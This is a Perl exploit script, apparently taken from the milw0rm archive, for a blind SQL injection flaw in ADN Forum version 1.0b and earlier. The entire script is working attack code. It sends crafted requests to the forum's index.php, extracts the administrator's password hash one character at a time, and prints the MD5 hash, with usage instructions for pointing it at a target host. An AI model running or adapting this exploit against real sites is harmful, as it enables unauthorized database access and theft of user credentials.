#!/usr/bin/perl
# --------------------------------------------------
# ADN Forum <= 1.0b Blind SQL Injection Exploit
# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
# Discovered On: 01/10/2008
# Download: http://sourceforge.net/projects/adnforum/
# --------------------------------------------------
# Usage: perl exploit.pl http://localhost
# --------------------------------------------------

use strict;
use warnings;
use LWP::UserAgent;
use URI::Escape;

my ($request,$send,$ord,$hash,$uid) = (undef,undef,undef,undef,1);

my $host = shift @ARGV or die "[?] Usage: perl $0 http://[host]\n";
my @chars = (48..57, 97..102); 
my $http = new LWP::UserAgent;

for(0..32)
{
  foreach $ord(@chars) 
  {
    $send = "' or ascii(substring((select password from adn_usuarios where id=1),$uid,1))=$ord#";
    $send = uri_escape($send);
    
    $request = $http->get($host."/index.php?fid=".$send);
    
    if($request->is_success and $request->content =~ /hace clic en el boton de abajo/i)
    {
      $hash .= chr($ord); 
      $uid++;
    }
  }
}

if(defined $hash)
{
  print "[+] MD5: $hash\n";
  exit;
}
else
{
  print "[?] Exploit Failed!\n";
  exit;
}

# milw0rm.com [2008-10-01]
